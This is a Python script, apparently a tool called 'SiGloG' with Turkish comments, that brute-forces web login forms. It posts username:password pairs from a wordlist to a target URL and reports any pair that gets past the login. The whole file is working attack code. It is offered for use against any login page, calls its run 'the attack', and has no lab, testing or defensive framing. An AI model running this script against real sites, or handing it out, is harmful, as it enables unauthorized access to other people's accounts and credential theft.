import requests
import sys
import time
from datetime import datetime
import json

def login_bruteForce(target_url, data, error_str):
    
    try:
        # Wordlist'ten verileri oku
        with open("modwordlist.txt", "r") as file:
            lines = file.readlines()            
            
        # POST ve form bilgilerini hazırla
        count = 0
        for line in lines:
            username, password = line.strip().split(":")
            count += 1
        
            # JSON veriyi bir Python sözlüğüne çevir
            data_dict = json.loads(data)

            # Kullanıcı adı ve şifre verilerini güncelle
            data_dict['username'] = username
            data_dict['password'] = password

            # POST isteği
            response_data = requests.post(target_url, data=data_dict)            
            response_success_messages = ["Welcome","Login Successful", "Hoş Geldiniz", "Giriş Başarılı", "Erişim Onaylandı", "Giriş İşlemi Tamamlandı", "Başarılı Giriş"]
            
            # Yanıt kontrol noktası
            if error_str not in str(response_data.content) and any(msg in str(response_data.content) for msg in response_success_messages):
                print(f"\033[1;37m[ATTEMPT] Login Success - username '{username}' - password '{password}' {count} of 47 [Found]\033[0m\n")
                print("1 of 1 target successfully completed, 1 valid password found")
                now = datetime.now()
                print(f"SiGloG (https://github.com/hunkaracar) finished at {now}")
                sys.exit(0)
                
            else:
                print(f"[ATTEMPT] Login Failed - username '{username}' - password: '{password}' {count} of 47 [trying]")
                time.sleep(1)
                
        now2 = datetime.now()
        print(f"\nThe attack on the login page has been completed [{target_url}]")       
        print("47 password attempts were made and were not successful [47 Trying]")
        print(f"SiGloG (https://github.com/hunkaracar) finished at {now2}")
        
               
    except Exception as error:
        print(f"\nReturn Error Code => {error}\n")
        print("Check Syntax or Network connection!!!")
        
        
    except KeyboardInterrupt:
        print("Attack stopped!")
        

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python3 loginBruteForce.py <hedef_url> '<veri_json> <error_str>'")
        sys.exit(1)

    target_url = sys.argv[1]
    data = sys.argv[2]
    error_str = sys.argv[3]
    
    login_bruteForce(target_url, data, error_str)
